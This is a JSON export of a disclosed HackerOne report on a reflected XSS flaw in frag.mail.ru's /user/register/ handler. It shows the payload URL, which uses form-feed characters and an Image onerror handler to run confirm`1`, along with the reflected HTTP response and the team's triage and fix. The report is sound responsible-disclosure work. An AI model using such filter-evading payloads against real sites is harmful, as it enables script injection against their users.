{"id":214642,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ2NDI=","url":"https://hackerone.com/reports/214642","title":"Reflected XSS on frag.mail.ru","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-19T12:16:40.844Z","submitted_at":"2017-03-19T12:16:40.844Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"twicedi","url":"/twicedi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-10T14:56:05.232Z","bug_reporter_agreed_on_going_public_at":"2017-05-04T11:21:26.779Z","team_member_agreed_on_going_public_at":"2017-05-10T14:56:05.189Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"##Domain, site, application##\n\nThe \"frag.mail.ru\" is affected by a reflected XSS vulnerability on the \"/user/register/\" handler.\n\n\n##Testing environment##\n\nThe exploitation of the issue has been tested on the latest version (at the time of writing) of Firefox: 52.0.1 (both 32 and 64 bit) on Sierra and Windows 7 OS.\n\n##Steps to reproduce##\n\nTo exploit the issue the victim has to visit the following URL: https://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C\n\n##Actual results##\n\nSince the input is reflected inside the response and no output encoding is done the payload injected is executed inside the context of the webpage.\n\n##Expected results and recommendations##\n\nTo protect the application against cross-site scripting attacks, assume that all input is malicious. Constrain and validate all input. Encode all output that could, potentially, include HTML characters.\n\n##PoC, exploit code, screenshots, video, references, additional resources##\n\nBy visiting the following URL: https://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C on Firefox, the JavaScript code injected inside the payload is correclty executed, as showed in the following snippet of response and as it is possible to see in the screenshot attached.\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nServer: nginx\nDate: Sun, 19 Mar 2017 11:51:36 GMT\nContent-Type: text/html; charset=utf-8\nConnection: close\nExpires: Sun, 19 Nov 1978 05:00:00 GMT\nLast-Modified: Sun, 19 Mar 2017 11:51:28 GMT\nCache-Control: store, no-cache, must-revalidate\nCache-Control: post-check=0, pre-check=0\nX-Filter-Time: 1.088 ms\nX-Res-Usage-Time: U=52000,S=8000,R=88202\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000\nContent-Length: 23218\n\n\u003c!DOCTYPE HTML\u003e\n\n[REDACTED...]\n\n\n\t\u003cdiv id=\"block_content\" class=\"user_register_!\"--!\u003e\u003cImage\fSrcset=K\fOnerror=confirm`1`\f\"\u003e\n\t\t\u003cdiv id=\"content\"\u003e\n\t\t\t\u003cdiv id=\"block_center\"\u003e\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\u003cdiv class=\"block_text\"\u003e\n\t\t\t\t\t\t\u003cdiv class=\"text_content_block\"\u003e\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\u003cdiv class=\"bg_title\"\u003e\n\t\t\t\t\t\t\t\t\t\u003cdiv class=\"title_userregister!\"--!\u003e\u003cImage\fSrcset=K\fOnerror=confirm`1`\f\"\u003e\n\n\t\t\t\t\t\t\t\t\t\u003c/div\u003e\n\t\t\t\t\t\t\t\t\u003c/div\u003e\n            \n\n[REDACTED...]\n```\n\nI'm available for further clarification,\n\nBest,\nDavide","vulnerability_information_html":"\u003ch2 id=\"domain-site-application\"\u003eDomain, site, application\u003c/h2\u003e\n\n\u003cp\u003eThe \u0026quot;frag.mail.ru\u0026quot; is affected by a reflected XSS vulnerability on the \u0026quot;/user/register/\u0026quot; handler.\u003c/p\u003e\n\n\u003ch2 id=\"testing-environment\"\u003eTesting environment\u003c/h2\u003e\n\n\u003cp\u003eThe exploitation of the issue has been tested on the latest version (at the time of writing) of Firefox: 52.0.1 (both 32 and 64 bit) on Sierra and Windows 7 OS.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h2\u003e\n\n\u003cp\u003eTo exploit the issue the victim has to visit the following URL: \u003ca title=\"https://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C\" href=\"/redirect?url=https%3A%2F%2Ffrag.mail.ru%2Fuser%2Fregister%2F%21%2522--%21%253E%253CImage%250CSrcset%253DK%250COnerror%253Dconfirm%25601%2560%250C\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"actual-results\"\u003eActual results\u003c/h2\u003e\n\n\u003cp\u003eSince the input is reflected inside the response and no output encoding is done the payload injected is executed inside the context of the webpage.\u003c/p\u003e\n\n\u003ch2 id=\"expected-results-and-recommendations\"\u003eExpected results and recommendations\u003c/h2\u003e\n\n\u003cp\u003eTo protect the application against cross-site scripting attacks, assume that all input is malicious. Constrain and validate all input. Encode all output that could, potentially, include HTML characters.\u003c/p\u003e\n\n\u003ch2 id=\"poc-exploit-code-screenshots-video-references-additional-resources\"\u003ePoC, exploit code, screenshots, video, references, additional resources\u003c/h2\u003e\n\n\u003cp\u003eBy visiting the following URL: \u003ca title=\"https://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C\" href=\"/redirect?url=https%3A%2F%2Ffrag.mail.ru%2Fuser%2Fregister%2F%21%2522--%21%253E%253CImage%250CSrcset%253DK%250COnerror%253Dconfirm%25601%2560%250C\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e on Firefox, the JavaScript code injected inside the payload is correclty executed, as showed in the following snippet of response and as it is possible to see in the screenshot attached.\u003c/p\u003e\n\n\u003cp\u003eResponse:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHTTP/1.1 200 OK\nServer: nginx\nDate: Sun, 19 Mar 2017 11:51:36 GMT\nContent-Type: text/html; charset=utf-8\nConnection: close\nExpires: Sun, 19 Nov 1978 05:00:00 GMT\nLast-Modified: Sun, 19 Mar 2017 11:51:28 GMT\nCache-Control: store, no-cache, must-revalidate\nCache-Control: post-check=0, pre-check=0\nX-Filter-Time: 1.088 ms\nX-Res-Usage-Time: U=52000,S=8000,R=88202\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000\nContent-Length: 23218\n\n\u0026lt;!DOCTYPE HTML\u0026gt;\n\n[REDACTED...]\n\n\n    \u0026lt;div id=\u0026quot;block_content\u0026quot; class=\u0026quot;user_register_!\u0026quot;--!\u0026gt;\u0026lt;ImageSrcset=KOnerror=confirm`1`\u0026quot;\u0026gt;\n        \u0026lt;div id=\u0026quot;content\u0026quot;\u0026gt;\n            \u0026lt;div id=\u0026quot;block_center\u0026quot;\u0026gt;\n\n                                                    \u0026lt;div class=\u0026quot;block_text\u0026quot;\u0026gt;\n                        \u0026lt;div class=\u0026quot;text_content_block\u0026quot;\u0026gt;\n\n                                                            \u0026lt;div class=\u0026quot;bg_title\u0026quot;\u0026gt;\n                                    \u0026lt;div class=\u0026quot;title_userregister!\u0026quot;--!\u0026gt;\u0026lt;ImageSrcset=KOnerror=confirm`1`\u0026quot;\u0026gt;\n\n                                    \u0026lt;/div\u0026gt;\n                                \u0026lt;/div\u0026gt;\n\n\n[REDACTED...]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eI\u0026#39;m available for further clarification,\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nDavide\u003c/p\u003e\n","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":169928,"file_name":"Reflected_XSS.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/169/928/af0fbcc30c2386d43bfdb2f0106019bf0af3a894/Reflected_XSS.png?response-content-disposition=attachment%3B%20filename%3D%22Reflected_XSS.png%22%3B%20filename%2A%3DUTF-8%27%27Reflected_XSS.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045803Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026X-Amz-Signature=b5a243da8ada2bbee31c0255b6f4cd92730a7a0b6b41786a7e7c3bab794b611c","file_size":828115,"type":"image/png"}],"allow_singular_disclosure_at":"2017-06-03T11:21:26.841Z","allow_singular_disclosure_after":-112728996.32201111,"singular_disclosure_allowed":true,"vote_count":6,"voters":["twicedi","eveeez","khizer47","spetr0x","jugno","superhedgy"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1551687,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for reporting your bug to Mail.Ru Group!   We appreciate your time for helping us to make our web services safer.\nWe are currently reviewing your submission and will be back in touch soon..\nUnfortunately,  your report is not in a bug bounty program's scope (check the [rules](https://hackerone.com/mailru)), so  we cannot qualify you for monetary reward. We say \"thank you\" for your help and contribution.","markdown_message":"\u003cp\u003eThank you for reporting your bug to Mail.Ru Group!   We appreciate your time for helping us to make our web services safer.\u003cbr\u003e\nWe are currently reviewing your submission and will be back in touch soon..\u003cbr\u003e\nUnfortunately,  your report is not in a bug bounty program\u0026#39;s scope (check the \u003ca href=\"https://hackerone.com/mailru\"\u003erules\u003c/a\u003e), so  we cannot qualify you for monetary reward. We say \u0026quot;thank you\u0026quot; for your help and contribution.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-20T09:20:54.315Z","updated_at":"2017-03-20T09:20:54.315Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1551688,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-20T09:21:00.339Z","updated_at":"2017-03-20T09:21:00.339Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1618404,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Your bug has been fixed! \nPlease confirm that you are no longer able to reproduce the issue. ","markdown_message":"\u003cp\u003eYour bug has been fixed! \u003cbr\u003e\nPlease confirm that you are no longer able to reproduce the issue. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-18T14:38:25.572Z","updated_at":"2017-04-18T14:38:25.572Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"twicedi","url":"/twicedi"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1621805,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank @kpebetka for the update!\n\nIt seems that the target is no longer reachable so it is not possible to reproduce the issue.\n\nBest,\nDavide","markdown_message":"\u003cp\u003eThank \u003ca href=\"/kpebetka\"\u003e@kpebetka\u003c/a\u003e for the update!\u003c/p\u003e\n\n\u003cp\u003eIt seems that the target is no longer reachable so it is not possible to reproduce the issue.\u003c/p\u003e\n\n\u003cp\u003eBest,\u003cbr\u003e\nDavide\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-19T18:35:27.710Z","updated_at":"2017-04-19T18:35:27.710Z","actor":{"username":"twicedi","cleared":false,"url":"/twicedi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1653512,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose it?\n\nThanks,\nDavide","markdown_message":"\u003cp\u003eCan we disclose it?\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nDavide\u003c/p\u003e\n","automated_response":false,"created_at":"2017-05-04T11:21:26.802Z","updated_at":"2017-05-04T11:21:26.802Z","first_to_agree":true,"actor":{"username":"twicedi","cleared":false,"url":"/twicedi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1665877,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-10T14:56:05.209Z","updated_at":"2017-05-10T14:56:05.209Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1665878,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-10T14:56:05.248Z","updated_at":"2017-05-10T14:56:05.248Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}